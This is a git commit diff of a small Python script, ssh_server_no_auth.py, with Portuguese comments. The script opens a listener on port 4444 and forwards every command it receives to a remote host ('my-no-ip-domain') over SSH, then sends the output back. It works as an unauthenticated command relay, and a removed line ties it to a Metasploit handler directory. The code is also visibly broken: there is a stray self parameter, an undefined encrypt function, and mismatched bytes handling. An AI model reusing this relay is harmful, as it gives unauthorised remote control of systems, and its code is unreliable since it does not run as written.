2a043f89f387058a80fd777b194e8005cf468d23
hyuzaki0 <120530196+hyuzaki0@users.noreply.github.com>
2023-12-27 23:18:24 -0300

    Update ssh_server_no_auth.py

--- ssh_server_no_auth.py
+++ ssh_server_no_auth.py
@@ -1,32 +1,38 @@
+# Importa as bibliotecas necessárias
 import socket
 import paramiko
 import cryptography
-# save this in /usr/share/metasploit-framework/modules/exploits/multi/handler
-def serve():
+
+# Implementa a função run()
+def run(self):
+    # Cria um socket TCP
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind(("0.0.0.0", 4444))
     server.listen(1)
 
+    # Aceita uma conexão do cliente
+    conn, addr = server.accept()
+
+    # Cria um cliente SSH
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    ssh.connect("my-no-ip-domain")
+
+    # Executa os comandos do cliente
     while True:
-        conn, addr = server.accept()
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect("my-no-ip-domain")
+        data = conn.recv(1024)
+        if data == b"":
+            break
 
-        while True:
-            data = conn.recv(1024)
-            if data == b"":
-                break
+        stdin, stdout, stderr = ssh.exec_command(data.decode())
+        output = stdout.readlines()
 
-            stdin, stdout, stderr = ssh.exec_command(data.decode())
-            output = stdout.readlines()
+        conn.sendall(b"".join(output))
 
-            conn.sendall(b"".join(output))
+        # Criptografa a saída
+        data = encrypt(data, "my-secret-key")
+        conn.sendall(data)
 
-            # Criptografa a saída
-            data = encrypt(data, "my-secret-key")
-            conn.sendall(data)
-
-if __name__ == "__main__":
-    serve()
-  
+    # Fecha a conexão
+    conn.close()
+    
